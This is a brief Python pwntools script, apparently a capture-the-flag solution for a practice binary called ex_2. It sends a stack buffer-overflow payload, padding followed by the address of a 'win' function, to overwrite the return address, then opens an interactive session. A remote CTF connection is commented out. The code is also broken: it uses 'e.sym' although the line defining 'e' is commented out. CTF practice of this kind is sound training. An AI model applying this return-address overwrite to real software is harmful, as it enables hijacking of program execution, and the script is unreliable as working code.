from pwn import *
#no_stack_smashing_here
#p = remote("cweaccessionsctf.com", 1370)
p = process('./ex_2')
# e = ELF("./ex_2")
payload = b'A'*30 + p64(e.sym['win'])
print(payload)
p.sendline(payload)
p.interactive()
